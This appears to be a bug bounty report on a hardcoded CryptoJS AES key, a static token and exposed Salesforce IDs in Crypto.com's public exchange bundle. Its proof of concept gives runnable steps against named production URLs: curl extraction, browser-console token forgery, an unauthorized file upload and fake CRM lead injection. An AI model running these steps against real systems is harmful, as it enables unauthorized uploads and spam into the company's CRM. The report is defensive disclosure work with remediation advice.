# C6 – Hardcoded CryptoJS AES Key and Static Token in Public JS Enable Unauthorized File Upload to VIP Portal Backend

## Summary

The `crypto.com/exchange` Vite bundle `constants-FblV6Gy_.js` (publicly accessible, no authentication required) contains two hardcoded values used to "protect" the VIP programme file upload endpoint:

- **AES encryption key**: `"iu-fbf_2502=gexeanch"`
- **Static token value**: `"4-not_hacked=kento"`

The VIP portal (`vip-portal-BoZ9nwsz.js`) encrypts `{timestamp: Date.now(), token: "4-not_hacked=kento"}` using CryptoJS AES with the hardcoded key, then submits this as the `token` field to `POST /v1/files/vip-form-upload-files` along with uploaded files.

Since both the key and the plaintext token value are in public JavaScript, any unauthenticated visitor can forge a valid upload token and submit files directly to the VIP form upload API without going through the legitimate VIP application form.

Additionally, the same constants file exposes Salesforce WebToLead credentials (org ID + all field IDs) enabling direct CRM injection.

**Asset**: `crypto.com/exchange` (Tier 1)
**Files**:
- `https://crypto.com/exchange/assets/constants-FblV6Gy_.js`
- `https://crypto.com/exchange/assets/vip-portal-BoZ9nwsz.js`
- `https://crypto.com/exchange/assets/common-CCBOve0E.js`

**Related Findings**: C4 and C5 document the same vulnerability class (hardcoded cryptographic keys in public JS) across two other Tier 1 assets. C6 represents a third independent instance, confirming a systemic issue in Crypto.com's frontend security.

---

## Vulnerability Details

### Hardcoded AES Key and Static Token in Public Bundle

**From `constants-FblV6Gy_.js`:**
```javascript
// Hardcoded values (publicly readable, no auth required)
Lr = "iu-fbf_2502=gexeanch"   // AES encryption key  (exported as cu → Pt)
Pr = "4-not_hacked=kento"      // Static token value  (exported as ct → wt)
```

**From `vip-portal-BoZ9nwsz.js` — token generation and upload:**
```javascript
async function se(b) {
  const u = b.target.files, j = Array.from(u);
  const I = new FormData;

  // Encrypt static token with hardcoded key — BOTH values are in public JS
  const D = St.AES.encrypt(
    JSON.stringify({ timestamp: Date.now(), token: wt }),  // wt = "4-not_hacked=kento"
    Pt                                                      // Pt = "iu-fbf_2502=gexeanch"
  ).toString();

  I.append("token", D);
  j.forEach(E => I.append("files", E));

  const E = await U(I);  // POST /v1/files/vip-form-upload-files
  if (E.length || E.response.status === 200) {
    const C = E.map(ie => ie.fileUrl);  // Returns hosted file URLs
    t.uploadFileUrl.value = [...C];
  }
}
```

**From `common-CCBOve0E.js` — upload API endpoint:**
```javascript
const M4 = e => ({
  fetcher: t => e.bff.post(
    "/v1/files/vip-form-upload-files",
    t,
    { headers: { "Content-Type": "multipart/form-data" } }
  ),
  normalize: OB
});
// M4 exported as hV → imported as Et → fetchWithNoEffect:U in vip-portal
```

### Salesforce WebToLead Credential Exposure

**From `constants-FblV6Gy_.js`:**
```javascript
Ur = "00D5i000003KVi4"   // Salesforce org ID (production)
Gr = "https://webto.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8"

// Production Salesforce field IDs (full VIP application form):
Qt.prod = {
  countryOfIncorporation: "00N5i00000NB3hG",
  operatingCountry:       "00N5i00000IoyQs",
  contactMethod:          "00N5i00000CNbTl",
  telegramUsername:       "00NJ3000000SxN6",
  tradingVolume:          "00N5i00000CNbTY",
  entityType:             "00N5i00000CNbTR",
  totalAssetUnderManagement: "00N5i00000CNbTL",
  uuid:                   "00NJ3000000SxN5",
  uploadFile:             "00NJ3000004EYvd"
}
```

With the org ID and field IDs, an attacker can POST fake VIP programme applications directly to Crypto.com's Salesforce CRM without interacting with the exchange UI.

---

## Proof of Concept

### Step 1 — Extract credentials from public bundle (no authentication)
```bash
curl -s "https://crypto.com/exchange/assets/constants-FblV6Gy_.js" \
  | grep -oE '(Lr|Pr)="[^"]+"'
# Output:
# Lr="iu-fbf_2502=gexeanch"
# Pr="4-not_hacked=kento"
```

### Step 2 — Forge upload token (browser console on exchange page)
```javascript
// CryptoJS is already loaded by the exchange bundle
// Import it from the vendor chunk
const { default: CryptoJS } = await import(
  "https://crypto.com/exchange/assets/vendor-D2cV3bgQ.js"
);

const KEY   = "iu-fbf_2502=gexeanch";  // from constants-FblV6Gy_.js
const TOKEN = "4-not_hacked=kento";     // from constants-FblV6Gy_.js

const forged = CryptoJS.AES.encrypt(
  JSON.stringify({ timestamp: Date.now(), token: TOKEN }),
  KEY
).toString();

console.log("Forged upload token:", forged);
```

### Step 3 — Submit unauthorized file upload
```javascript
const form = new FormData();
form.append("token", forged);
form.append("files", new File(["test"], "test.txt", { type: "text/plain" }));

const resp = await fetch(
  "https://exchange-nts.crypto.com/bff/v1/files/vip-form-upload-files",
  { method: "POST", body: form }
);
console.log("Upload response:", await resp.json());
// Expected: file hosted URL returned, bypassing VIP form requirement
```

### Step 4 — Fake Salesforce VIP application (CRM injection)
```javascript
// Submit fake VIP lead directly to Crypto.com's Salesforce CRM
const payload = new URLSearchParams({
  oid: "00D5i000003KVi4",               // org ID from constants-FblV6Gy_.js
  retURL: "https://crypto.com/exchange",
  first_name: "Security",
  last_name:  "Researcher",
  email:      "test@example.com",
  "00N5i00000IoyQs": "SG",              // operatingCountry field ID
  "00N5i00000CNbTY": "1000000",         // tradingVolume field ID
  lead_source: "Direct"
});

await fetch(
  "https://webto.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8",
  { method: "POST", body: payload }
);
// Injects fake VIP application into Crypto.com's CRM
```

---

## Root Cause

The VIP portal uses client-side AES encryption as a weak CSRF-like guard on the file upload endpoint. The intent is to prove the upload request came from the legitimate VIP form page. However:

1. Both the encryption key and the token value are static hardcoded strings in a public JavaScript bundle
2. CryptoJS.AES with a string key uses EVP_BytesToKey with a random salt — but since the entire key material is public, any attacker can generate a cryptographically valid ciphertext
3. The "token" never changes (`"4-not_hacked=kento"`) — it provides no replay protection

This is the **third instance** of the same vulnerability class across Crypto.com's Tier 1 assets:

| Finding | Asset | Key/Credential | Endpoint Protected |
|---------|-------|---------------|-------------------|
| C4 | `crypto.com/exchange` | `07773d32...` (AES-CBC/HMAC) | `/passkey/edit`, `/passkey/register` |
| C5 | `web.crypto.com` | `cdc-web@crypto.com` PBKDF2 | Passcode, OTP, KYC, Payments |
| C6 | `crypto.com/exchange` | `iu-fbf_2502=gexeanch` (CryptoJS AES) | `/v1/files/vip-form-upload-files` |

---

## Impact

### Primary — Unauthorized File Upload
- Attacker can upload arbitrary files to `/v1/files/vip-form-upload-files` without submitting a VIP application
- Server returns hosted `fileUrl` values — files are stored on Crypto.com infrastructure
- Depending on server-side content validation: potential for stored XSS via SVG upload, phishing via hosted content, or storage abuse

### Secondary — Salesforce CRM Injection
- Full VIP application form field IDs exposed for both dev and prod Salesforce orgs
- Attacker can submit unlimited fake VIP programme applications to Crypto.com's CRM
- Impact: pollutes lead pipeline, wastes sales team resources, potential data integrity issues

### Tertiary — Systemic Pattern
- Three separate Tier 1 assets use hardcoded cryptographic keys in public JS
- Indicates a platform-wide frontend security anti-pattern, not an isolated incident

---

## CVSS

**CVSS 3.1: 6.5 (Medium)**
`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

- **PR:None** — hardcoded key extraction requires no authentication
- **I:High** — arbitrary file upload to production storage + CRM injection
- **C:None** — no direct data exfiltration confirmed at this stage (may increase with further discovery)

---

## Remediation

1. **Immediate**: Remove hardcoded `"iu-fbf_2502=gexeanch"` and `"4-not_hacked=kento"` from `constants-FblV6Gy_.js`. Rotate and move to server-side secrets.

2. **Architectural**: Replace client-side token with a server-issued per-session CSRF token (e.g., double-submit cookie pattern or synchronizer token). The server should issue a short-lived, unpredictable token tied to the authenticated session.

3. **File Upload Hardening**: Validate uploaded file types server-side (whitelist images only), scan for malicious content, and do not serve uploaded files from the same origin as the exchange (use a sandboxed CDN domain).

4. **Salesforce**: Rotate/regenerate Salesforce field IDs where possible, or implement rate limiting and CAPTCHA on the WebToLead endpoint to prevent CRM spam.

5. **Audit**: Apply automated secret scanning (truffleHog, detect-secrets) to all exchange Vite bundles in CI/CD — this is the third hardcoded key found across the platform.

---

## Supporting Materials

- `screenshot_C6_1_hardcoded_key.png` — key and token visible in `constants-FblV6Gy_.js`
- `screenshot_C6_2_upload_usage.png` — token forgery code in `vip-portal-BoZ9nwsz.js`
- `screenshot_C6_3_upload_endpoint.png` — `/v1/files/vip-form-upload-files` in `common-CCBOve0E.js`

---

## Timeline
- **2026-04-12**: Vulnerability discovered during exchange Vite bundle analysis
- **2026-04-12**: Hardcoded key and upload endpoint confirmed across 3 bundle files
- **2026-04-12**: Salesforce credential exposure confirmed
- **2026-04-12**: Report drafted, held pending HackerOne signal restoration
